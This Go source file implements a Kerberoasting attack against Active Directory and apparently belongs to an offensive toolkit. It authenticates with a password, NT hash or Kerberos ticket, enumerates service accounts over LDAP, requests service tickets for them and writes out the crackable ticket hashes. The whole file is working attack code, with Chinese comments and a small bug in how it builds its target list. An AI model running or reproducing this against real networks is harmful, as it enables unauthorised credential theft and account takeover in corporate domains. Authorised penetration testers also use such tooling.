package kerberos

import (
	"fmt"
	"github.com/go-ldap/ldap/v3"
	"github.com/vincd/savoir/modules/paquet/krb5"
	"os"
	"strings"
	"tdk/conf"
)

type spnTarget struct {
	username      string
	targetSpnName string
}

func Kerberoasting(l **ldap.Conn, domain string, dcIp string, targetSpnName string, enctype string, outputFile string, ldapSizeLimit int, ticket string, password string, username string) error {
	var useLdap bool
	var key string
	var socks string

	if err := conf.ValidateETypeFlag(enctype); err != nil {
		return err
	}

	//判断hash
	if len(password) == 32 {
		key = password
		password = ""
	}

	// 从TGT获取用户名和域
	if len(ticket) > 0 {
		kirbi, err := krb5.NewKrbCredFromFile(ticket)
		if err != nil {
			return fmt.Errorf("cannot load kirbi: %s", err)
		}

		if len(username) == 0 {
			username = kirbi.UserName()
		}

		if len(domain) == 0 {
			domain = kirbi.UserRealm()
		}

		eType := conf.GetETypeFromFlagValue(enctype)
		if eType != kirbi.EType() {
			fmt.Printf("[!] The ticket use an encryption type %d and you set %d\n", kirbi.EType(), eType)
		}
	} else {
		if err := conf.ValidateDomainUserFlagsWithTicket(username, password, key, ticket); err != nil {
			return err
		}
	}

	if err := conf.ValidateETypeFlag(enctype); err != nil {
		return err
	}

	// 判断是否使用ldap认证
	// 不支持使用票据进行LDAP身份验证
	if len(targetSpnName) != 0 {
		useLdap = false
	} else {
		useLdap = true
	}

	conf.PrintDomainInformation(domain, dcIp)

	//代理
	dialer, err := conf.GetKdcDialer(socks)
	if err != nil {
		return fmt.Errorf("Cannot create SOCKS client: %s", err)
	}

	var tgtCred *krb5.KRBCred
	targets := make([]spnTarget, 0)

	if len(ticket) > 0 {
		fmt.Printf("[*] Use a kirbi file as credentials\n")
		kirbi, err := krb5.NewKrbCredFromFile(ticket)
		if err != nil {
			return fmt.Errorf("cannot load kirbi: %s", err)
		}

		tgtCred = kirbi
	} else {
		keyBytes, err := conf.GetKeyFlagValue(key)
		if err != nil {
			return err
		}

		fmt.Printf("[*] Use username and password/key as credentials to request a TGT\n")
		tgt, err := krb5.AskTGT(dialer, domain, username, password, keyBytes, conf.GetETypeFromFlagValue(enctype), dcIp, false, false)
		if err != nil {
			return fmt.Errorf("cannot ask TGT: %s", err)
		}

		tgtCred = tgt.Credentials()
	}

	if len(targetSpnName) > 0 {
		fmt.Printf("[*] Keberoast SPN %s\n", targetSpnName)
		targets = append(targets, spnTarget{username: "USER", targetSpnName: targetSpnName})

	} else if useLdap {
		fmt.Printf("[*] Use LDAP to retreive vulnerable accounts\n")
		SearchKerberoast := ldap.NewSearchRequest(
			KosListDomain,
			ldap.ScopeWholeSubtree,
			ldap.NeverDerefAliases,
			ldapSizeLimit,
			0,
			false,
			conf.Ldap_queries["kerberoasting"],
			[]string{"sAMAccountName", "servicePrincipalName", "distinguishedName"},
			nil)
		kerberoastUser, err := (*l).Search(SearchKerberoast)
		if err != nil {
			fmt.Println(err)
		}

		if len(kerberoastUser.Entries) == 0 {
			fmt.Printf("[!] No user to Kerberoast found in LDAP\n")
			return nil
		}

		fmt.Printf("[*] Found %d users to Kerberoast found in LDAP\n", len(kerberoastUser.Entries))

		for _, entry := range kerberoastUser.Entries {
			fmt.Printf("[*] %s\n", entry.DN)
			fmt.Printf("    sAMAccountName      : %s\n", entry.GetAttributeValue("sAMAccountName"))
			fmt.Printf("    distinguishedName   : %s\n", entry.GetAttributeValue("distinguishedName"))
			fmt.Printf("    servicePrincipalName: %s\n", entry.GetAttributeValue("servicePrincipalName"))

			for _, spnName := range entry.GetAttributeValues("sAMAccountName") {
				targets = append(targets, spnTarget{username: spnName, targetSpnName: spnName})
			}
		}
	}

	hashes := ""
	for _, target := range targets {
		principalName := krb5.PrincipalName{
			NameType:   krb5.KRB_NT_MS_PRINCIPAL,
			NameString: strings.Split(target.targetSpnName, "/"),
		}

		fmt.Printf("[*] Asking TGS for principal: %s\n", target.targetSpnName)
		tgs, err := krb5.AskTGSWithKirbi(dialer, domain, principalName, tgtCred, dcIp)
		if err != nil {
			msg := fmt.Sprintf("Cannot ask TGS for principal %s: %s", target.targetSpnName, err)
			if len(targets) == 1 {
				return fmt.Errorf("%s", msg)
			} else {
				fmt.Printf("[!] %s\n", msg)
			}
		} else {
			hashes += fmt.Sprintf("%s\n", tgs.HashString(target.username, target.targetSpnName))
		}
	}

	if len(outputFile) == 0 {
		fmt.Printf("[*] Hashes:\n%s\n", hashes)
	} else {
		f, err := os.Create(outputFile)
		if err != nil {
			return fmt.Errorf("cannot create hash file: %s", err)
		}
		defer f.Close()

		f.Write([]byte(hashes))
		fmt.Printf("[*] Save hashes to: %s\n", outputFile)
	}

	return nil
}
